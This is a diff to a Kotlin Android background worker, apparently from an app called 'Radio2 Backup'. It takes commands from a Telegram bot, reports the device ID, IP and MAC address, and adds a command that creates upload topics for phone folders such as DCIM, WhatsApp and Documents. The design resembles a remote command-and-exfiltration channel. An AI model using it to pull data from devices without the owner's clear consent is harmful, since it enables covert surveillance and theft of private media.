@@ -9,6 +9,7 @@ import androidx.work.WorkManager
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.RequestBody.Companion.asRequestBody
 import org.json.JSONObject
 import java.io.IOException
 import java.util.concurrent.TimeUnit
@@ -17,6 +18,8 @@ import java.text.SimpleDateFormat
 import java.util.*
 import kotlinx.coroutines.*
 import kotlinx.coroutines.flow.first
+import java.io.File
+import android.os.Build
 
 class TelegramCommandWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
     companion object {
@@ -237,6 +240,17 @@ class TelegramCommandWorker(context: Context, params: WorkerParameters) : Worker
                     enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo estadísticas de GitHub: "+e.message)
                 }
             }
+            text.contains("/crear_carpetas", ignoreCase = true) -> {
+                Log.d(TAG, "Comando recibido: crear_carpetas")
+                try {
+                    workerScope.launch {
+                        crearEstructuraCarpetas(token, chatId)
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error creando carpetas: "+e.message)
+                    enviarConfirmacionTelegram(token, chatId, "❌ Error creando carpetas: "+e.message)
+                }
+            }
         }
     }
 
@@ -256,6 +270,7 @@ class TelegramCommandWorker(context: Context, params: WorkerParameters) : Worker
             🔍 */device_info* - Información detallada del dispositivo
             🔄 */github_sync* - Sincroniza con GitHub
             📊 */github_stats* - Estadísticas de GitHub
+            📁 */crear_carpetas* - Crea estructura de temas en Telegram
             
             _Envía cualquier comando para ejecutarlo._
         """.trimIndent()
@@ -372,27 +387,118 @@ class TelegramCommandWorker(context: Context, params: WorkerParameters) : Worker
             val deviceInfo = DeviceInfo(applicationContext).getDeviceData()
             
             """
-                🔍 *Información Detallada del Dispositivo:*
-                
-                🆔 *ID Único:* ${deviceInfo.deviceId}
-                📱 *Nombre:* ${deviceInfo.deviceName}
-                🌐 *Dirección IP:* ${deviceInfo.ipAddress}
-                📡 *Dirección MAC:* ${deviceInfo.macAddress}
-                🤖 *Versión Android:* ${deviceInfo.androidVersion}
-                🏭 *Fabricante:* ${deviceInfo.manufacturer}
-                📋 *Modelo:* ${deviceInfo.model}
-                📦 *Aplicación:* Radio2 Backup v1.0.0
-                🕐 *Timestamp:* ${deviceInfo.timestamp}
-                
-                📊 *Información JSON:*
-                ```json
-                ${DeviceInfo(applicationContext).getDeviceInfoJson()}
-                ```
-                
-                🕐 *Última actualización:* ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
+🔍 *Información Detallada del Dispositivo:*
+
+🆔 *ID Único:* ${deviceInfo.deviceId}
+📱 *Nombre:* ${deviceInfo.deviceName}
+🌐 *Dirección IP:* ${deviceInfo.ipAddress}
+📡 *Dirección MAC:* ${deviceInfo.macAddress}
+🤖 *Versión Android:* ${deviceInfo.androidVersion}
+🏭 *Fabricante:* ${deviceInfo.manufacturer}
+📋 *Modelo:* ${deviceInfo.model}
+📦 *Aplicación:* Radio2 Backup v1.0.0
+🕐 *Timestamp:* ${deviceInfo.timestamp}
+
+📊 *Información JSON:*
+\`\`\`json
+${DeviceInfo(applicationContext).getDeviceInfoJson()}
+\`\`\`
+
+🕐 *Última actualización:* ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
             """.trimIndent()
         } catch (e: Exception) {
             "Error obteniendo info detallada del dispositivo: ${e.message}"
+        }
+    }
+
+    private suspend fun crearEstructuraCarpetas(token: String, chatId: String) {
+        try {
+            enviarConfirmacionTelegram(token, chatId, "📁 Creando estructura de temas en Telegram...")
+            
+            val folders = listOf(
+                "📸 DCIM",
+                "📸 DCIM/Camera",
+                "📸 DCIM/Screenshots", 
+                "📸 DCIM/WhatsApp",
+                "📸 DCIM/Telegram",
+                "📸 DCIM/Instagram",
+                "📸 DCIM/Downloads",
+                "📸 DCIM/Other",
+                "📸 Pictures",
+                "🎥 Movies",
+                "🎥 Videos",
+                "🎵 Music",
+                "🎵 Ringtones",
+                "🎵 Notifications",
+                "🎵 Alarms",
+                "📄 Documents",
+                "📄 Downloads",
+                "📱 Apps",
+                "📁 Other"
+            )
+
+            var temasCreados = 0
+            for (folder in folders) {
+                try {
+                    // Crear un archivo temporal para crear el tema
+                    val tempFile = File(applicationContext.cacheDir, "tema_${folder.replace("/", "_").replace(" ", "_")}.txt")
+                    tempFile.writeText("📁 Tema creado para: $folder\n\nEste tema se usará para organizar archivos de la carpeta: $folder")
+                    
+                    val url = "https://api.telegram.org/bot$token/sendDocument"
+                    
+                    val requestBody = MultipartBody.Builder()
+                        .setType(MultipartBody.FORM)
+                        .addFormDataPart("chat_id", chatId)
+                        .addFormDataPart("document", tempFile.name, tempFile.asRequestBody("text/plain".toMediaTypeOrNull()))
+                        .addFormDataPart("caption", "📁 Creando tema: $folder")
+                        .addFormDataPart("parse_mode", "HTML")
+                        .build()
+
+                    val request = Request.Builder().url(url).post(requestBody).build()
+                    val client = OkHttpClient()
+                    val response = client.newCall(request).execute()
+                    
+                    if (response.isSuccessful) {
+                        temasCreados++
+                        Log.d(TAG, "✅ Tema creado: $folder")
+                    } else {
+                        Log.w(TAG, "⚠️ No se pudo crear tema: $folder - ${response.code}")
+                    }
+                    response.close()
+                    
+                    // Eliminar archivo temporal
+                    tempFile.delete()
+                    
+                    delay(200) // Pausa para evitar rate limiting
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error creando tema $folder: ${e.message}")
+                }
+            }
+            
+            val mensajeFinal = """
+                ✅ *Estructura de Temas Creada*
+                
+                📁 Temas creados: $temasCreados/${folders.size}
+                📱 Dispositivo: ${Build.MANUFACTURER} ${Build.MODEL}
+                🕐 Fecha: ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
+                
+                *Temas disponibles:*
+                • 📸 DCIM (Camera, Screenshots, WhatsApp, etc.)
+                • 🎥 Videos y Movies
+                • 🎵 Music, Ringtones, Notifications
+                • 📄 Documents y Downloads
+                • 📱 Apps
+                • 📁 Other
+                
+                Los archivos se organizarán automáticamente según su ubicación.
+                Para usar un tema, envía un archivo con el caption del tema deseado.
+            """.trimIndent()
+            
+            enviarConfirmacionTelegram(token, chatId, mensajeFinal)
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "Error creando estructura de temas: ${e.message}")
+            enviarConfirmacionTelegram(token, chatId, "❌ Error creando estructura de temas: ${e.message}")
         }
     }
 
